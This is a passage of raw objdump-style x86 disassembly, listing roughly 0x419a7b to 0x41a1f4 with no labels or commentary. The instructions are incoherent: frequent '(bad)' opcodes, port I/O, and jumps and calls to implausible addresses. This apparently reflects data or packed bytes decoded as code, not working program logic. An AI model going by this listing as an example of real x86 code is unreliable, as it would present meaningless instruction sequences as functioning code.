  419a7b:	xor    BYTE PTR [ebx+0xc],bl
  419a7e:	pushf  
  419a7f:	scas   eax,DWORD PTR es:[edi]
  419a80:	push   edx
  419a81:	sub    al,cl
  419a83:	das    
  419a84:	pop    ebp
  419a85:	mov    eax,ds:0x79bafdb7
  419a8a:	stos   BYTE PTR es:[edi],al
  419a8b:	inc    edi
  419a8c:	inc    edi
  419a8d:	jl     0x419a28
  419a8f:	inc    esp
  419a90:	push   0x7b
  419a92:	mov    edi,0x8a9c5dce
  419a97:	sbb    BYTE PTR [edx],0xe8
  419a9a:	popa   
  419a9b:	stos   BYTE PTR es:[edi],al
  419a9c:	ret    0xe3fc
  419a9f:	xor    dh,bl
  419aa1:	call   0x670a94f6
  419aa6:	aam    0x94
  419aa8:	inc    esi
  419aa9:	sti    
  419aaa:	mov    ah,0x1
  419aac:	test   BYTE PTR [ebx],al
  419aae:	mov    ah,0x77
  419ab0:	lods   eax,DWORD PTR ds:[esi]
  419ab1:	(bad)  
  419ab2:	push   ebx
  419ab3:	jle    0x419a5b
  419ab5:	push   edx
  419ab6:	ja     0x419b2d
  419ab8:	jbe    0x419b07
  419aba:	cdq    
  419abb:	or     DWORD PTR [edi+0x2b2f91d8],edi
  419ac1:	ja     0x419ab8
  419ac3:	jge    0x419abe
  419ac5:	outs   dx,DWORD PTR ds:[esi]
  419ac6:	call   FWORD PTR [eax]
  419ac8:	add    al,0xa4
  419aca:	mov    ds:0xbb0705bd,eax
  419acf:	loope  0x419b0d
  419ad1:	out    dx,eax
  419ad2:	outs   dx,BYTE PTR ds:[esi]
  419ad3:	div    BYTE PTR [eax+0x53261a05]
  419ad9:	xchg   ebp,eax
  419ada:	pop    eax
  419adb:	cs (bad) 
  419add:	cmc    
  419ade:	ja     0x419ac5
  419ae0:	seto   ch
  419ae3:	call   0xb068ea35
  419ae8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ae9:	and    BYTE PTR [ecx+0x47a4f042],ah
  419aef:	and    al,0xdf
  419af1:	lds    si,DWORD PTR [edi+edi*4-0x3a79b11c]
  419af9:	repz adc BYTE PTR [edx+0x767968c8],bh
  419b00:	jecxz  0x419b7f
  419b02:	hlt    
  419b03:	and    BYTE PTR [edi+0x5b],bh
  419b06:	das    
  419b07:	jl     0x419ac0
  419b09:	xchg   ebp,eax
  419b0a:	cmp    eax,0x4dc7eb
  419b0f:	shr    dh,1
  419b11:	ret    0x11a4
  419b14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b15:	std    
  419b16:	or     esp,DWORD PTR [edx-0x4]
  419b19:	out    0x36,eax
  419b1b:	sub    eax,0x15591084
  419b20:	push   0xffffffc1
  419b22:	sbb    dh,BYTE PTR [edx+ecx*8]
  419b25:	mov    fs,WORD PTR [ebx-0x13d4b31d]
  419b2b:	inc    esp
  419b2c:	aam    0xd3
  419b2e:	jmp    0x1960a82e
  419b33:	pop    edx
  419b34:	jecxz  0x419b68
  419b36:	sub    al,0x3a
  419b38:	xor    ecx,ebp
  419b3a:	pop    ds
  419b3b:	(bad)  
  419b3c:	ficom  WORD PTR [edi-0x7c66a608]
  419b42:	cmc    
  419b43:	inc    esp
  419b44:	test   BYTE PTR [esi+0x41],bh
  419b47:	fcomp  DWORD PTR [ecx+0x76]
  419b4a:	in     eax,dx
  419b4b:	inc    edi
  419b4c:	cdq    
  419b4d:	fidiv  WORD PTR [ecx+0x73]
  419b50:	inc    edx
  419b51:	xchg   ecx,eax
  419b52:	bound  esp,QWORD PTR [edx-0x7d]
  419b55:	pop    es
  419b56:	je     0x419bd2
  419b58:	push   eax
  419b59:	push   esp
  419b5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b5c:	dec    edx
  419b5d:	mov    ebx,0xe7ce188f
  419b62:	push   edi
  419b63:	or     edi,DWORD PTR [ebp-0x6c]
  419b66:	add    al,0xae
  419b68:	std    
  419b69:	or     dh,BYTE PTR [edi+0x60758b6d]
  419b6f:	test   BYTE PTR [ebx-0x30],bh
  419b72:	sub    al,0x25
  419b74:	cmp    al,0xf5
  419b76:	sbb    eax,0xbbb05ba5
  419b7b:	nop
  419b7c:	shr    DWORD PTR [ecx+edi*1],1
  419b7f:	inc    ebx
  419b80:	fadd   QWORD PTR [eax+0x64]
  419b83:	mov    al,0x86
  419b85:	fiadd  WORD PTR [edi+0x47db0d3f]
  419b8b:	jle    0x419c01
  419b8d:	call   0xec788d8a
  419b92:	into   
  419b93:	and    BYTE PTR es:[ecx+0x5a6376af],0x75
  419b9b:	xchg   ecx,eax
  419b9c:	repnz ins BYTE PTR es:[edi],dx
  419b9e:	sub    al,0x7d
  419ba0:	adc    esi,ebp
  419ba2:	mov    ?,WORD PTR [eax+0x45]
  419ba5:	out    dx,al
  419ba6:	jns    0x419bd2
  419ba8:	scas   al,BYTE PTR es:[edi]
  419ba9:	jo     0x419b6b
  419bab:	fisttp QWORD PTR [eax+0x29]
  419bae:	dec    ebx
  419baf:	pop    ss
  419bb0:	push   edi
  419bb1:	push   ds
  419bb2:	cmp    eax,0x44d3495e
  419bb7:	jmp    0x4b4a9a44
  419bbc:	push   0x17a1c4dc
  419bc1:	sub    DWORD PTR ds:0xa29ff846,eax
  419bc7:	sti    
  419bc8:	enter  0xdd3,0x87
  419bcc:	bound  esp,QWORD PTR ds:0x14277d58
  419bd2:	and    al,0x41
  419bd4:	das    
  419bd5:	sbb    eax,0x4b324221
  419bda:	pushf  
  419bdb:	repz fbstp TBYTE PTR [ebp-0x24]
  419bdf:	jbe    0x419c2e
  419be1:	fistp  QWORD PTR [edi-0x569fe982]
  419be7:	pop    ecx
  419be8:	ins    DWORD PTR es:[edi],dx
  419be9:	inc    ebp
  419bea:	shl    BYTE PTR [ecx+0x24],1
  419bed:	cmc    
  419bee:	push   0xffffffc1
  419bf0:	dec    edi
  419bf1:	xor    ebx,DWORD PTR [esi+0xb09aeb5]
  419bf7:	mov    al,BYTE PTR [ecx+eiz*8]
  419bfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419bfb:	(bad)
  419bfe:	pop    ebx
  419bff:	iret   
  419c00:	fimul  DWORD PTR [ecx]
  419c02:	cli    
  419c03:	mov    bl,0x8d
  419c05:	inc    ebx
  419c06:	dec    edx
  419c07:	test   dh,bl
  419c09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c0a:	sbb    al,0x89
  419c0c:	sbb    al,0x6
  419c0e:	mov    ?,WORD PTR [ebx-0x5574156a]
  419c14:	sti    
  419c15:	scas   eax,DWORD PTR es:[edi]
  419c16:	mov    dl,0x41
  419c18:	cmp    BYTE PTR [edx-0x6d],0x7b
  419c1c:	add    al,0x63
  419c1e:	xchg   esi,eax
  419c1f:	cmp    BYTE PTR [edi-0x5917ae41],al
  419c25:	outs   dx,DWORD PTR ds:[esi]
  419c26:	adc    eax,0xa28108ec
  419c2b:	add    cl,dh
  419c2d:	xchg   esi,eax
  419c2e:	add    edx,ebp
  419c30:	jns    0x419bdd
  419c32:	popa   
  419c33:	aad    0xcd
  419c35:	or     esi,esi
  419c37:	adc    ecx,DWORD PTR [edi+0x47258e0a]
  419c3d:	sub    eax,0x7f99851
  419c42:	(bad)  
  419c43:	xchg   ecx,eax
  419c44:	push   ds
  419c45:	neg    DWORD PTR [edi+0x54]
  419c48:	xor    eax,0xa84143fc
  419c4d:	call   FWORD PTR [ebp+0x56d55e27]
  419c53:	sub    esi,edx
  419c55:	pop    ebx
  419c56:	mov    al,ds:0x5ab43946
  419c5b:	out    0xff,al
  419c5d:	jle    0x419c15
  419c5f:	(bad)  
  419c60:	mov    ds:0x6f73af58,eax
  419c65:	lds    edx,FWORD PTR [ecx-0x18bdde2d]
  419c6b:	jg     0x419c08
  419c6d:	inc    eax
  419c6e:	mov    bh,0x6d
  419c70:	pop    ebx
  419c71:	pop    es
  419c72:	outs   dx,BYTE PTR ds:[esi]
  419c73:	(bad)  
  419c74:	int    0x20
  419c76:	inc    edi
  419c77:	push   ss
  419c78:	jo     0x419bfc
  419c7a:	iret   
  419c7b:	xchg   edx,eax
  419c7c:	mov    ds:0x8ac761ec,al
  419c81:	ja     0x419c84
  419c83:	mov    ch,0x90
  419c85:	stc    
  419c86:	dec    edx
  419c87:	or     DWORD PTR [ebp+0xf],0xffffff9a
  419c8b:	inc    edx
  419c8c:	mov    ecx,DWORD PTR [ecx+ecx*1]
  419c8f:	psllq  mm7,mm6
  419c92:	enter  0x87a,0xc3
  419c96:	jecxz  0x419cdb
  419c98:	jg     0x419c97
  419c9a:	xchg   esi,eax
  419c9b:	jo     0x419cf4
  419c9d:	sbb    eax,0x86df3f4f
  419ca2:	xor    DWORD PTR [edx-0x2593e0f7],esp
  419ca8:	scas   eax,DWORD PTR es:[edi]
  419ca9:	mov    ebp,0x7de4d361
  419cae:	xchg   ebx,eax
  419caf:	mov    bl,0x7e
  419cb1:	sbb    al,bh
  419cb3:	repz sahf 
  419cb5:	or     eax,0x6661533d
  419cba:	test   al,0x55
  419cbc:	in     al,dx
  419cbd:	aas    
  419cbe:	ror    edx,0xc4
  419cc1:	xchg   esi,eax
  419cc2:	ficomp WORD PTR [ebp-0x25]
  419cc5:	call   0x3e8:0x79d1f38e
  419ccc:	sbb    esi,DWORD PTR [ecx]
  419cce:	js     0x419c54
  419cd0:	retf   
  419cd1:	or     DWORD PTR [ecx-0x4a6a0f58],ebx
  419cd7:	repz dec esi
  419cd9:	ins    BYTE PTR es:[edi],dx
  419cda:	not    BYTE PTR [ebp-0x19]
  419cdd:	cs add al,0xc
  419ce0:	cld    
  419ce1:	test   DWORD PTR [ecx],0xfa8945fa
  419ce7:	push   0x1f63bb51
  419cec:	sti    
  419ced:	cld    
  419cee:	xor    dl,BYTE PTR [eax+0x37]
  419cf1:	mov    dh,BYTE PTR [ebx-0x59]
  419cf4:	stos   DWORD PTR es:[edi],eax
  419cf5:	fisttp QWORD PTR [eax]
  419cf7:	aaa    
  419cf8:	pushf  
  419cf9:	pop    ebp
  419cfa:	mov    al,0x9c
  419cfc:	and    al,0x48
  419cfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cff:	add    DWORD PTR [bp+di+0x37],ecx
  419d03:	cmc    
  419d04:	adc    eax,0x698457c4
  419d09:	xchg   ecx,eax
  419d0a:	xchg   ecx,eax
  419d0b:	mov    ch,0x9e
  419d0d:	iret   
  419d0e:	shl    edx,1
  419d10:	cs setbe ah
  419d14:	cmp    ebx,DWORD PTR [edx-0x22]
  419d17:	pop    ebx
  419d18:	jle    0x419cbb
  419d1a:	and    bl,BYTE PTR [esi+0x73]
  419d1d:	dec    esi
  419d1e:	inc    edx
  419d1f:	cwde   
  419d20:	add    DWORD PTR [edi+0x36cddee3],eax
  419d26:	std    
  419d27:	jmp    0x7837:0xf115d2a4
  419d2e:	enter  0x9457,0x28
  419d32:	enter  0x7887,0x6d
  419d36:	arpl   dx,bp
  419d38:	aaa    
  419d39:	clc    
  419d3a:	sti    
  419d3b:	dec    esp
  419d3c:	ins    DWORD PTR es:[edi],dx
  419d3d:	out    dx,eax
  419d3e:	dec    ebx
  419d3f:	lds    eax,FWORD PTR [esp+eiz*4+0x6a]
  419d43:	lock mov esi,0xc3b28f14
  419d49:	add    dh,ah
  419d4b:	outs   dx,BYTE PTR ds:[esi]
  419d4c:	cmove  ebx,DWORD PTR [eax-0x55]
  419d50:	jp     0x419da4
  419d52:	xchg   ecx,eax
  419d53:	adc    al,0x4c
  419d55:	or     al,0x56
  419d57:	add    eax,0x44000bff
  419d5c:	mov    esi,0xb8a7a336
  419d61:	in     eax,dx
  419d62:	push   0xffffffa7
  419d64:	fild   WORD PTR [esi-0x2c]
  419d67:	and    al,0x66
  419d69:	mov    edi,0xcc261a3e
  419d6e:	add    bh,dh
  419d70:	jno    0x419d53
  419d72:	(bad)  
  419d73:	aaa    
  419d74:	jecxz  0x419d1f
  419d76:	cmp    esp,DWORD PTR [esi+0x2a243e15]
  419d7c:	sbb    DWORD PTR [ebx+0x64],ebp
  419d7f:	adc    bl,BYTE PTR [ebx]
  419d81:	dec    eax
  419d82:	mov    ah,0x17
  419d84:	mov    eax,0xa4539afa
  419d89:	jge    0x419d57
  419d8b:	lock pushf 
  419d8d:	push   esi
  419d8e:	inc    esp
  419d8f:	call   FWORD PTR [ebx+0x10591257]
  419d95:	push   ebx
  419d96:	(bad)  
  419d97:	in     eax,0xe4
  419d99:	adc    DWORD PTR [ecx-0x17],eax
  419d9c:	test   DWORD PTR [edi-0x104906e9],0x944158d0
  419da6:	and    ah,BYTE PTR [ebp+0x8d4927c]
  419dac:	push   esp
  419dad:	jno    0x419dff
  419daf:	xchg   cl,bl
  419db1:	pop    edi
  419db2:	ja     0x419d4a
  419db4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419db5:	lock neg DWORD PTR [ebx+0x25]
  419db9:	pop    ss
  419dba:	rcr    dl,1
  419dbc:	fild   DWORD PTR [edx+0xe]
  419dbf:	mov    bl,BYTE PTR [edi+0x2d]
  419dc2:	push   ebx
  419dc3:	out    0x8f,al
  419dc5:	mov    al,ds:0xca7cabd9
  419dca:	dec    ebp
  419dcb:	sub    ah,BYTE PTR [edx-0x2c12c69c]
  419dd1:	xchg   ebp,eax
  419dd2:	mul    esp
  419dd4:	inc    edx
  419dd5:	popf   
  419dd6:	pop    esp
  419dd7:	adc    al,0x56
  419dd9:	mov    edx,edi
  419ddb:	cmp    ah,BYTE PTR [ecx+0x13]
  419dde:	mov    al,ds:0xa1bcb985
  419de3:	xlat   BYTE PTR ds:[ebx]
  419de4:	in     eax,0x82
  419de6:	inc    esp
  419de7:	addr16 push esp
  419de9:	shr    BYTE PTR ds:0x9ece7b7c,0xb7
  419df0:	loopne 0x419e5f
  419df2:	inc    eax
  419df3:	das    
  419df4:	add    esi,ecx
  419df6:	aam    0xdf
  419df8:	test   al,0x1e
  419dfa:	dec    ebp
  419dfb:	ror    BYTE PTR ss:[esi+ecx*8+0x5d],cl
  419e00:	pop    ebp
  419e01:	(bad)  
  419e02:	fidivr WORD PTR [esi+0x7d8603e2]
  419e08:	dec    ebp
  419e09:	cmp    DWORD PTR [esi-0x41c9c776],eax
  419e0f:	ror    DWORD PTR [eax-0x4fd9ce77],0xa9
  419e16:	shl    BYTE PTR ds:0x5b26b83e,1
  419e1c:	sbb    DWORD PTR ds:0xbf9df57a,esi
  419e22:	jmp    0xdedc525a
  419e27:	dec    ebx
  419e28:	xchg   esi,eax
  419e29:	enter  0x3da7,0x2a
  419e2d:	mov    BYTE PTR [edi],ah
  419e2f:	cmp    ebx,DWORD PTR es:[eax+0x4afecfef]
  419e36:	fistp  DWORD PTR gs:[esi-0x8d42e9a]
  419e3d:	mov    al,ds:0x52b5aa5d
  419e42:	or     ah,ch
  419e44:	jnp    0x419e10
  419e46:	iret   
  419e47:	xor    al,BYTE PTR [edx]
  419e49:	dec    ecx
  419e4a:	pop    ebp
  419e4b:	outs   dx,DWORD PTR ds:[esi]
  419e4c:	pop    esi
  419e4d:	jno    0x419eb3
  419e4f:	dec    ecx
  419e50:	push   0x1e70328a
  419e55:	push   eax
  419e56:	sbb    al,BYTE PTR cs:[ecx]
  419e59:	ficom  WORD PTR [ebx+0x73bfd2de]
  419e5f:	outs   dx,DWORD PTR ds:[esi]
  419e60:	inc    edx
  419e61:	xchg   esi,eax
  419e62:	int3   
  419e63:	imul   eax,DWORD PTR [ebx+eiz*8-0x1d],0x6a111473
  419e6b:	es pop eax
  419e6d:	xchg   dl,dl
  419e6f:	xchg   esp,eax
  419e70:	jo     0x419e0e
  419e72:	inc    ecx
  419e73:	adc    DWORD PTR [edi+0x72],esp
  419e76:	mov    esi,0x13c73554
  419e7b:	repnz loope 0x419ebd
  419e7e:	mov    esi,0x56cb7a77
  419e83:	sub    DWORD PTR [edx],ebp
  419e85:	mov    ds:0xf79d2b2f,al
  419e8a:	sbb    edi,ebp
  419e8c:	test   eax,0xb8d0e8c0
  419e91:	pop    eax
  419e92:	jnp    0x419ecf
  419e94:	vpmaxsw xmm2,xmm3,XMMWORD PTR [edi+0x241e1c33]
  419e9c:	(bad)  
  419e9d:	out    dx,al
  419e9e:	lea    ecx,[ebx+esi*8-0x5abfe81b]
  419ea5:	sbb    DWORD PTR gs:[edi-0x9ccefc7],0xffffffa7
  419ead:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419eae:	ins    BYTE PTR es:[edi],dx
  419eaf:	out    dx,eax
  419eb0:	xlat   BYTE PTR ds:[ebx]
  419eb1:	pop    ds
  419eb2:	icebp  
  419eb3:	push   0x7f
  419eb5:	(bad)
  419eb8:	sbb    al,0x6d
  419eba:	shl    BYTE PTR [edx+eax*2],0x92
  419ebe:	xchg   esp,eax
  419ebf:	js     0x419e75
  419ec1:	and    ah,BYTE PTR ds:0x2b86acd1
  419ec7:	fmul   QWORD PTR [ebp-0x61b3b418]
  419ecd:	fsubr  QWORD PTR ds:0xb5338610
  419ed3:	xor    ah,BYTE PTR [edx+0x5a86c05]
  419ed9:	mov    ecx,0xb1260ac6
  419ede:	sbb    al,0x8c
  419ee0:	sar    BYTE PTR [esi],1
  419ee2:	outs   dx,BYTE PTR ds:[esi]
  419ee3:	push   cs
  419ee4:	xchg   esi,eax
  419ee5:	jg     0x419f60
  419ee7:	cmp    esp,DWORD PTR [eax+0x61]
  419eea:	adc    ebp,ecx
  419eec:	in     eax,0xcd
  419eee:	dec    eax
  419eef:	inc    ebp
  419ef0:	cs push ss
  419ef2:	jbe    0x419ea9
  419ef4:	and    al,0x41
  419ef6:	or     esp,ebp
  419ef8:	fwait
  419ef9:	sub    eax,0xc4a6b91b
  419efe:	iret   
  419eff:	das    
  419f00:	add    ecx,DWORD PTR [esi]
  419f02:	sbb    al,0x80
  419f04:	xchg   esp,eax
  419f05:	cli    
  419f06:	mov    ah,0x20
  419f08:	add    DWORD PTR [ecx-0x62ca5698],0xed03a650
  419f12:	sub    al,0xc2
  419f14:	pop    esi
  419f15:	push   ecx
  419f16:	mov    bl,0x2
  419f18:	fdivr  QWORD PTR [esp+ebp*8]
  419f1b:	push   esi
  419f1c:	loope  0x419f8c
  419f1e:	imul   ebx,DWORD PTR ds:0xb1d9843d,0x39ca9b01
  419f28:	dec    ecx
  419f29:	test   BYTE PTR [edx-0x2f],al
  419f2c:	jmp    0xa2ca:0x361aa5f8
  419f33:	sbb    eax,0xfca11be4
  419f38:	add    DWORD PTR es:[ebx+0x6e],esi
  419f3c:	ss sub al,0x9a
  419f3f:	and    ecx,DWORD PTR [esi]
  419f41:	sahf   
  419f42:	mov    cl,0xb2
  419f44:	adc    bl,BYTE PTR [edx]
  419f46:	push   edx
  419f47:	inc    ebx
  419f48:	mov    ecx,0x97506bc9
  419f4d:	mov    ah,0xae
  419f4f:	jmp    0x264cb83b
  419f54:	cs mov edi,0xb6876242
  419f5a:	xchg   esp,eax
  419f5b:	dec    ebp
  419f5c:	mov    bl,0x3b
  419f5e:	imul   edi,ebx,0x214d00ed
  419f64:	push   ds
  419f65:	inc    ebp
  419f66:	pop    esp
  419f67:	mov    ebp,0xf98b8ce0
  419f6c:	jo     0x419fc3
  419f6e:	loop   0x419fd7
  419f70:	sub    ah,bh
  419f72:	mov    al,0x77
  419f74:	(bad)  
  419f75:	call   0x8923b2ff
  419f7a:	outs   dx,DWORD PTR ds:[esi]
  419f7b:	mov    ch,0x50
  419f7d:	mov    dl,0x6f
  419f7f:	pusha  
  419f80:	ret    0xdddb
  419f83:	out    dx,eax
  419f84:	adc    esi,DWORD PTR [edi-0x1a]
  419f87:	adc    al,0xbb
  419f89:	out    dx,eax
  419f8a:	mov    edi,0xe1b1908c
  419f8f:	mov    ebp,0xf12b6802
  419f94:	cmc    
  419f95:	pop    ecx
  419f96:	mov    al,ds:0xc1119544
  419f9b:	cmp    eax,0x2247b1bd
  419fa0:	fcom   DWORD PTR [edi+edi*2-0x4eb12f61]
  419fa7:	in     al,0xa7
  419fa9:	adc    edx,eax
  419fab:	mov    esi,0x32a28b4f
  419fb0:	cld    
  419fb1:	jecxz  0x419fd2
  419fb3:	dec    ecx
  419fb4:	lods   al,BYTE PTR ds:[esi]
  419fb5:	out    0x14,al
  419fb7:	dec    ebx
  419fb8:	pop    ecx
  419fb9:	or     dl,BYTE PTR [esi*1-0x15e46282]
  419fc0:	lock ret 
  419fc2:	in     eax,dx
  419fc3:	pop    eax
  419fc4:	inc    esi
  419fc5:	jbe    0x419f50
  419fc7:	retf   
  419fc8:	dec    edx
  419fc9:	(bad)  
  419fca:	fist   WORD PTR [ebx]
  419fcc:	cmp    al,0x6
  419fce:	(bad)  
  419fcf:	(bad)  
  419fd1:	(bad)  
  419fd2:	repz mov WORD PTR [esi-0x76],?
  419fd6:	jmp    0x41a01e
  419fd8:	ror    BYTE PTR [edx+0x42],cl
  419fdb:	push   cs
  419fdc:	mov    dl,0xab
  419fde:	xlat   BYTE PTR ds:[ebx]
  419fdf:	xlat   BYTE PTR ds:[ebx]
  419fe0:	mov    eax,0x543c0d36
  419fe5:	out    dx,al
  419fe6:	xchg   edx,eax
  419fe7:	dec    eax
  419fe8:	xor    esi,ebx
  419fea:	imul   esi,DWORD PTR [edi+0x54],0x34c85cab
  419ff1:	sub    eax,0xfc401650
  419ff6:	sbb    al,0x15
  419ff8:	pop    esp
  419ff9:	mov    esi,0x75ab37f7
  419ffe:	loopne 0x41a077
  41a000:	push   eax
  41a001:	xchg   ecx,eax
  41a002:	cmp    ecx,edx
  41a004:	pop    edx
  41a005:	push   ebp
  41a006:	test   BYTE PTR [ebx+0x1db5c9ba],bh
  41a00c:	mov    esi,0xa35b21d8
  41a011:	fmul   DWORD PTR [edx+eax*4-0x6a0f12cb]
  41a018:	mov    al,ds:0xf29fae0f
  41a01d:	repnz cmp DWORD PTR [edi+0x60],ebp
  41a021:	inc    ebp
  41a022:	jno    0x41a032
  41a024:	and    al,BYTE PTR [ecx]
  41a026:	sbb    cl,cl
  41a028:	xor    BYTE PTR [ebx],ah
  41a02a:	neg    BYTE PTR [ebx-0x1e00470e]
  41a030:	or     bl,BYTE PTR [ebx]
  41a032:	out    dx,eax
  41a033:	in     eax,0x5e
  41a035:	std    
  41a036:	cmp    BYTE PTR [esi+0x1c],bh
  41a039:	int3   
  41a03a:	jge    0x41a0a3
  41a03c:	mov    bh,0xa2
  41a03e:	(bad)  
  41a040:	or     DWORD PTR [ebp+0x6a],0xffffffcc
  41a044:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a045:	stos   DWORD PTR es:[edi],eax
  41a046:	sti    
  41a047:	scas   eax,DWORD PTR es:[edi]
  41a048:	daa    
  41a049:	or     bh,BYTE PTR [ebx-0x2f]
  41a04c:	ds pushw cs
  41a04f:	das    
  41a050:	repz iret 
  41a052:	inc    esi
  41a053:	inc    ecx
  41a055:	sar    DWORD PTR [esi+ebp*1+0x8],1
  41a059:	outs   dx,DWORD PTR ds:[esi]
  41a05a:	bound  esi,QWORD PTR [edi+0x62]
  41a05d:	lods   eax,DWORD PTR ds:[esi]
  41a05e:	fdivr  DWORD PTR [ebx+0x215aaa54]
  41a064:	sbb    edx,edi
  41a066:	lea    edi,[esi+eax*1]
  41a069:	xor    eax,0x93ae753d
  41a06e:	shr    BYTE PTR [edx+edx*1-0x4ff234bf],cl
  41a075:	scas   eax,DWORD PTR es:[edi]
  41a076:	pop    ds
  41a077:	add    eax,0x5c279e50
  41a07c:	popa   
  41a07d:	mov    esi,0x7f2e312
  41a082:	(bad)  
  41a083:	aas    
  41a084:	and    al,0x97
  41a086:	jl     0x41a0ec
  41a088:	ins    BYTE PTR es:[edi],dx
  41a089:	jg     0x41a05e
  41a08b:	or     al,0xe7
  41a08d:	lea    ecx,[esi-0x145e9414]
  41a093:	xchg   ecx,eax
  41a094:	pushf  
  41a095:	adc    BYTE PTR ds:0xcf3d07a7,al
  41a09b:	jo     0x41a05b
  41a09d:	lock outs dx,BYTE PTR ds:[esi]
  41a09f:	lds    edx,FWORD PTR ds:0xbe3f9166
  41a0a5:	adc    edx,DWORD PTR [ebx-0x4e]
  41a0a8:	out    0x6e,al
  41a0aa:	add    eax,0x31b2c187
  41a0af:	push   ecx
  41a0b0:	outs   dx,DWORD PTR ds:[esi]
  41a0b1:	das    
  41a0b2:	mov    ebx,0x7e126c48
  41a0b7:	inc    esi
  41a0b8:	push   0x2f757b34
  41a0bd:	dec    esp
  41a0be:	or     al,0x10
  41a0c0:	test   bl,ch
  41a0c2:	sub    eax,0x2de4cd44
  41a0c7:	aad    0x52
  41a0c9:	dec    ebp
  41a0ca:	xchg   esp,eax
  41a0cb:	mov    edi,0x3f442fff
  41a0d0:	popf   
  41a0d1:	mov    al,ds:0x7faa969a
  41a0d6:	dec    edx
  41a0d7:	popa   
  41a0d8:	inc    BYTE PTR [ecx-0x69bd4d1f]
  41a0de:	iret   
  41a0df:	adc    BYTE PTR [eax],ah
  41a0e1:	pop    ss
  41a0e2:	sahf   
  41a0e3:	jmp    0x6de3580d
  41a0e8:	xor    DWORD PTR [eax*2+0x41d8e88c],ebp
  41a0ef:	icebp  
  41a0f0:	jg     0x41a103
  41a0f2:	pop    ecx
  41a0f3:	pusha  
  41a0f4:	(bad)  
  41a0f5:	data16 ror BYTE PTR [ecx+0x34],1
  41a0f9:	dec    edi
  41a0fa:	shr    dh,1
  41a0fc:	les    si,DWORD PTR [eax]
  41a0ff:	sub    al,0x3a
  41a101:	mov    ah,0xd5
  41a103:	(bad)  
  41a104:	in     al,dx
  41a105:	sbb    bl,dl
  41a107:	ret    0xf643
  41a10a:	and    eax,0xd56ef607
  41a10f:	jle    0x41a144
  41a111:	cmp    ebp,DWORD PTR [ebp-0x7f]
  41a114:	mov    ah,BYTE PTR [ebp+0x1a]
  41a117:	rep stos DWORD PTR es:[edi],eax
  41a119:	xor    bl,bl
  41a11b:	push   esp
  41a11c:	sar    BYTE PTR [ebx],0xda
  41a11f:	fcom   DWORD PTR [ebx-0x68]
  41a122:	jecxz  0x41a148
  41a124:	jge    0x41a101
  41a126:	mov    esi,0xa653ef9c
  41a12b:	imul   ebp,edx,0xffffffae
  41a12e:	sbb    bh,dh
  41a130:	fistp  WORD PTR [edx+0x6f23ae2]
  41a136:	pop    edx
  41a137:	mov    WORD PTR [esi],gs
  41a139:	jecxz  0x41a172
  41a13b:	xchg   esi,eax
  41a13c:	stos   BYTE PTR es:[edi],al
  41a13d:	sti    
  41a13e:	or     BYTE PTR [esi-0x69],0x7f
  41a142:	mov    edx,fs
  41a144:	or     al,0xf0
  41a146:	fcmovnbe st,st(5)
  41a148:	sti    
  41a149:	push   ebx
  41a14a:	lods   al,BYTE PTR ds:[esi]
  41a14b:	sti    
  41a14c:	jbe    0x41a18e
  41a14e:	mov    cl,0x48
  41a150:	out    dx,eax
  41a151:	and    al,0xb3
  41a153:	jns    0x41a108
  41a155:	mov    al,ds:0xa72dddbc
  41a15a:	cwde   
  41a15b:	sbb    BYTE PTR [esi],cl
  41a15d:	add    DWORD PTR [esi+0x48],ebp
  41a160:	int3   
  41a161:	adc    al,0x81
  41a163:	mov    ah,0x4f
  41a165:	ins    DWORD PTR es:[edi],dx
  41a166:	aas    
  41a167:	in     eax,dx
  41a168:	pop    ebp
  41a169:	push   ss
  41a16a:	stos   DWORD PTR es:[edi],eax
  41a16b:	push   ss
  41a16c:	pop    ebx
  41a16d:	in     al,0xfc
  41a16f:	mov    dh,0x27
  41a171:	xor    eax,0x12c2083a
  41a176:	push   ss
  41a177:	ja     0x41a1dd
  41a179:	lock std 
  41a17b:	loop   0x41a16e
  41a17d:	or     ecx,eax
  41a17f:	ficom  WORD PTR [ecx-0x4a02345c]
  41a185:	stc    
  41a186:	(bad)
  41a189:	scas   al,BYTE PTR es:[edi]
  41a18a:	loope  0x41a1f9
  41a18c:	pop    ebx
  41a18d:	jp     0x41a170
  41a18f:	(bad)  
  41a190:	cmc    
  41a191:	pop    ebp
  41a192:	sti    
  41a193:	pop    ebp
  41a194:	ja     0x41a1ea
  41a196:	and    bl,BYTE PTR [edi+eax*4]
  41a199:	rcl    BYTE PTR [edi],0x8a
  41a19c:	inc    ecx
  41a19d:	test   al,0xd7
  41a19f:	scas   eax,DWORD PTR es:[edi]
  41a1a0:	int3   
  41a1a1:	jl     0x41a212
  41a1a3:	adc    DWORD PTR [esi],esp
  41a1a5:	nop
  41a1a6:	pusha  
  41a1a7:	xor    al,0xc0
  41a1a9:	stos   BYTE PTR es:[edi],al
  41a1aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a1ab:	xchg   esi,eax
  41a1ac:	popa   
  41a1ad:	ficomp WORD PTR [edx+0x3843a240]
  41a1b3:	fcomp  QWORD PTR [edi-0x41]
  41a1b6:	jge    0x41a228
  41a1b8:	int3   
  41a1b9:	sti    
  41a1ba:	adc    eax,0x42593e98
  41a1bf:	mov    dh,0xe1
  41a1c1:	mov    eax,0x4647b1dc
  41a1c6:	loop   0x41a17a
  41a1c8:	test   BYTE PTR [ecx+0x56c9360c],0x12
  41a1cf:	shl    ch,cl
  41a1d1:	dec    esp
  41a1d2:	pushf  
  41a1d3:	jmp    0x41a1e4
  41a1d5:	or     eax,0xbc770811
  41a1da:	adc    eax,0xbb8eb795
  41a1df:	mov    ah,0x10
  41a1e1:	rcr    BYTE PTR [ebp+0x45],1
  41a1e4:	push   ebx
  41a1e5:	retf   
  41a1e6:	out    0x95,eax
  41a1e8:	fnsave [ebp-0x761b969d]
  41a1ee:	cld    
  41a1ef:	out    dx,eax
  41a1f0:	enter  0x3ec7,0xf8
  41a1f4:	dec    esp
